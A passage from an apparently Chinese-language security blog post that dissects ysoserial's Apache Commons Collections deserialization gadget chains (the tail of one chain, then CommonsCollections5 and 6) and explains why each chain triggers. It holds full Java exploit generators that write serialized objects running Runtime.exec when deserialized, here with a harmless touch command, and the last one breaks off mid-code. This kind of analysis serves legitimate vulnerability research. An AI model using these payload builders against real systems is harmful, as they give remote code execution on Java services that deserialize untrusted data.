</span></span><span style=display:flex><span>        Field fieldName <span style=color:#ff79c6>=</span> templates<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;_name&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        fieldName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>templates<span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;rmb122&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Transformer<span style=color:#ff79c6>[]</span> transformers <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Transformer<span style=color:#ff79c6>[]{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> ConstantTransformer<span style=color:#ff79c6>(</span>Class<span style=color:#ff79c6>.</span><span style=color:#50fa7b>forName</span><span style=color:#ff79c6>(</span>TrAXFilter<span style=color:#ff79c6>)),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InstantiateTransformer<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>Templates<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span>templates<span style=color:#ff79c6>}),</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ChainedTransformer<span style=color:#ff79c6>(</span>transformers<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        TransformingComparator comparator <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> TransformingComparator<span style=color:#ff79c6>(</span>chainedTransformer<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        PriorityQueue queue <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> PriorityQueue<span style=color:#ff79c6>(</span>2<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        queue<span style=color:#ff79c6>.</span><span style=color:#50fa7b>add</span><span style=color:#ff79c6>(</span>1<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        queue<span style=color:#ff79c6>.</span><span style=color:#50fa7b>add</span><span style=color:#ff79c6>(</span>1<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Field field <span style=color:#ff79c6>=</span> PriorityQueue<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;queue&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        Object<span style=color:#ff79c6>[]</span> innerArr <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>Object<span style=color:#ff79c6>[])</span> field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>queue<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        innerArr<span style=color:#ff79c6>[</span>0<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> templates<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>        innerArr<span style=color:#ff79c6>[</span>1<span style=color:#ff79c6>]</span> <span style=color:#ff79c6>=</span> templates<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        field <span style=color:#ff79c6>=</span> PriorityQueue<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;comparator&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>queue<span style=color:#ff79c6>,</span> comparator<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ObjectOutputStream<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> FileOutputStream<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;out.bin&#34;</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>writeObject</span><span style=color:#ff79c6>(</span>queue<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>close</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><h2 id=commonscollections5>CommonsCollections5</h2><p>这个不是换汤不换药了, 用了一个新的利用链去触发 InvokerTransformer, 不过 ysoserial 上注释里面的调用链是错误的, 估计是忘记改了. 正确的如下:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Gadget chain:
</span></span><span style=display:flex><span>    ObjectInputStream.readObject()
</span></span><span style=display:flex><span>        BadAttributeValueExpException.readObject()
</span></span><span style=display:flex><span>            TiedMapEntry.toString()
</span></span><span style=display:flex><span>                    LazyMap.get()
</span></span><span style=display:flex><span>                        ChainedTransformer.transform()
</span></span><span style=display:flex><span>                            ConstantTransformer.transform()
</span></span><span style=display:flex><span>                            InvokerTransformer.transform()
</span></span><span style=display:flex><span>                                Method.invoke()
</span></span><span style=display:flex><span>                                    Class.getMethod()
</span></span><span style=display:flex><span>                            InvokerTransformer.transform()
</span></span><span style=display:flex><span>                                Method.invoke()
</span></span><span style=display:flex><span>                                    Runtime.getRuntime()
</span></span><span style=display:flex><span>                            InvokerTransformer.transform()
</span></span><span style=display:flex><span>                                Method.invoke()
</span></span><span style=display:flex><span>                                    Runtime.exec()
</span></span></code></pre></div><p>从注释里面还可以得到, 这个 chain 只能用于 >= 8u76, 且 SecurityManager 未设置的情况下使用.
原因是在 8u76 的更新里面, 添加了 <code>javax.management.BadAttributeValueExpException</code> 的 readObject 方法</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>private</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>readObject</span><span style=color:#ff79c6>(</span>ObjectInputStream ois<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> IOException<span style=color:#ff79c6>,</span> ClassNotFoundException <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    ObjectInputStream<span style=color:#ff79c6>.</span><span style=color:#50fa7b>GetField</span> gf <span style=color:#ff79c6>=</span> ois<span style=color:#ff79c6>.</span><span style=color:#50fa7b>readFields</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    Object valObj <span style=color:#ff79c6>=</span> gf<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;val&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>valObj <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        val <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>valObj <span style=color:#ff79c6>instanceof</span> String<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        val<span style=color:#ff79c6>=</span> valObj<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>System<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getSecurityManager</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span>
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Long
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Integer
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Float
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Double
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Byte
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Short
</span></span><span style=display:flex><span>            <span style=color:#ff79c6>||</span> valObj <span style=color:#ff79c6>instanceof</span> Boolean<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        val <span style=color:#ff79c6>=</span> valObj<span style=color:#ff79c6>.</span><span style=color:#50fa7b>toString</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span> <span style=color:#6272a4>// the serialized object is from a version without JDK-8019292 fix
</span></span></span><span style=display:flex><span><span style=color:#6272a4></span>        val <span style=color:#ff79c6>=</span> System<span style=color:#ff79c6>.</span><span style=color:#50fa7b>identityHashCode</span><span style=color:#ff79c6>(</span>valObj<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;@&#34;</span> <span style=color:#ff79c6>+</span> valObj<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getName</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>可以看到, 在 <code>System.getSecurityManager() == null</code> 的情况下, 将会不管 valObj 的类型, 调用 toString 方法, 这里需要配合 <code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 来使用, 其重写的 toString 方法</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> Object <span style=color:#50fa7b>getValue</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>map</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>key</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> String <span style=color:#50fa7b>toString</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getKey</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>+</span> <span style=color:#f1fa8c>&#34;=&#34;</span> <span style=color:#ff79c6>+</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getValue</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>看到熟悉的 map.get 了么, 这里就又回到了 LazyMap 的那一套, 接下来也不用多说了, exp 如下:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>package</span> demo.rmb122<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.Transformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ChainedTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ConstantTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.InvokerTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.keyvalue.TiedMapEntry<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.map.LazyMap<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> javax.management.BadAttributeValueExpException<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.FileOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.ObjectOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Field<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.HashMap<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.Map<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>CommonsCollections5</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span><span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>[]</span> args<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> Exception <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        Transformer<span style=color:#ff79c6>[]</span> transformers <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Transformer<span style=color:#ff79c6>[]{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> ConstantTransformer<span style=color:#ff79c6>(</span>java<span style=color:#ff79c6>.</span><span style=color:#50fa7b>lang</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>Runtime</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;getMethod&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>String<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Class<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#f1fa8c>&#34;getRuntime&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{}}),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;invoke&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>Object<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Object<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#ff79c6>null</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{}}),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;exec&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>String<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#ff79c6>new</span> String<span style=color:#ff79c6>[]{</span><span style=color:#f1fa8c>&#34;/bin/touch&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;/dev/shm/asdasd_1&#34;</span><span style=color:#ff79c6>}}),</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ChainedTransformer chainedTransformer <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ChainedTransformer<span style=color:#ff79c6>(</span>transformers<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        HashMap hashMap <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> HashMap<span style=color:#ff79c6>&lt;</span>String<span style=color:#ff79c6>,</span> String<span style=color:#ff79c6>&gt;();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Map lazyMap <span style=color:#ff79c6>=</span> LazyMap<span style=color:#ff79c6>.</span><span style=color:#50fa7b>decorate</span><span style=color:#ff79c6>(</span>hashMap<span style=color:#ff79c6>,</span> chainedTransformer<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        TiedMapEntry tiedMapEntry <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> TiedMapEntry<span style=color:#ff79c6>(</span>lazyMap<span style=color:#ff79c6>,</span> <span style=color:#f1fa8c>&#34;placeholder&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        BadAttributeValueExpException badAttributeValueExpException <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> BadAttributeValueExpException<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;placeholder&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        Field field <span style=color:#ff79c6>=</span> badAttributeValueExpException<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getClass</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>getDeclaredField</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;val&#34;</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>setAccessible</span><span style=color:#ff79c6>(</span><span style=color:#ff79c6>true</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        field<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(</span>badAttributeValueExpException<span style=color:#ff79c6>,</span> tiedMapEntry<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        ObjectOutputStream oos <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> ObjectOutputStream<span style=color:#ff79c6>(</span><span style=color:#ff79c6>new</span> FileOutputStream<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;out.bin&#34;</span><span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>writeObject</span><span style=color:#ff79c6>(</span>badAttributeValueExpException<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span>        oos<span style=color:#ff79c6>.</span><span style=color:#50fa7b>close</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>另外, 这一条链, 其实 3, 4 都能使用, 不过 ysoseiral 只在 exp 里面写了 3 的, 实际上只要将 import 的 xxx.collections.xxx 全改成 xxx.collections4.xxx, 然后将 <code>LazyMap.decorate</code> 改为 <code>LazyMap.LazyMap</code> 就能直接给 4 使用.</p><h2 id=commonscollections6>CommonsCollections6</h2><p>还是先看调用栈:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Gadget chain:
</span></span><span style=display:flex><span>    java.io.ObjectInputStream.readObject()
</span></span><span style=display:flex><span>        java.util.HashSet.readObject()
</span></span><span style=display:flex><span>            java.util.HashMap.put()
</span></span><span style=display:flex><span>            java.util.HashMap.hash()
</span></span><span style=display:flex><span>                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
</span></span><span style=display:flex><span>                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
</span></span><span style=display:flex><span>                    org.apache.commons.collections.map.LazyMap.get()
</span></span><span style=display:flex><span>                        org.apache.commons.collections.functors.ChainedTransformer.transform()
</span></span><span style=display:flex><span>                        org.apache.commons.collections.functors.InvokerTransformer.transform()
</span></span><span style=display:flex><span>                        java.lang.reflect.Method.invoke()
</span></span><span style=display:flex><span>                            java.lang.Runtime.exec()
</span></span></code></pre></div><p>这条与 CommonsCollections5 类似, 触发点由 BadAttributeValueExpException 改为 HashSet, 这里与 URLDNS 类似, 在反序列化时会重新计算对象的 hashCode, 而刚刚好 TiedMapEntry 的 hashCode 里面与 toString 一样也用到了 getValue.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd>int</span> <span style=color:#50fa7b>hashCode</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        Object value <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getValue</span><span style=color:#ff79c6>();</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getKey</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>?</span> 0 <span style=color:#ff79c6>:</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getKey</span><span style=color:#ff79c6>().</span><span style=color:#50fa7b>hashCode</span><span style=color:#ff79c6>())</span> <span style=color:#ff79c6>^</span> <span style=color:#ff79c6>(</span>value <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>?</span> 0 <span style=color:#ff79c6>:</span> value<span style=color:#ff79c6>.</span><span style=color:#50fa7b>hashCode</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span>    <span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>不过这里比较奇怪的是 HashMap 就已经有 hashCode 了, 不知道为什么还要再套一层 HashSet. 我自己重新编写的时候是直接用的 HashMap 作为触发点.</p><p>exp 如下:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff79c6>package</span> demo.rmb122<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.Transformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ChainedTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.ConstantTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.functors.InvokerTransformer<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.keyvalue.TiedMapEntry<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> org.apache.commons.collections.map.LazyMap<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.FileOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.io.ObjectOutputStream<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.lang.reflect.Field<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> java.util.HashMap<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>class</span> <span style=color:#50fa7b>CommonsCollections6</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>    <span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>main</span><span style=color:#ff79c6>(</span>String<span style=color:#ff79c6>[]</span> args<span style=color:#ff79c6>)</span> <span style=color:#8be9fd;font-style:italic>throws</span> Exception <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span>        Transformer<span style=color:#ff79c6>[]</span> fake <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Transformer<span style=color:#ff79c6>[]{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> ConstantTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;placeholder&#34;</span><span style=color:#ff79c6>),</span>
</span></span><span style=display:flex><span>        <span style=color:#ff79c6>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Transformer<span style=color:#ff79c6>[]</span> transformers <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>new</span> Transformer<span style=color:#ff79c6>[]{</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> ConstantTransformer<span style=color:#ff79c6>(</span>java<span style=color:#ff79c6>.</span><span style=color:#50fa7b>lang</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>Runtime</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>),</span>
</span></span><span style=display:flex><span>                <span style=color:#ff79c6>new</span> InvokerTransformer<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;getMethod&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{</span>String<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>,</span> Class<span style=color:#ff79c6>[].</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>},</span> <span style=color:#ff79c6>new</span> Object<span style=color:#ff79c6>[]{</span><span style=color:#f1fa8c>&#34;getRuntime&#34;</span><span style=color:#ff79c6>,</span> <span style=color:#ff79c6>new</span> Class<span style=color:#ff79c6>[]{}}),</span>
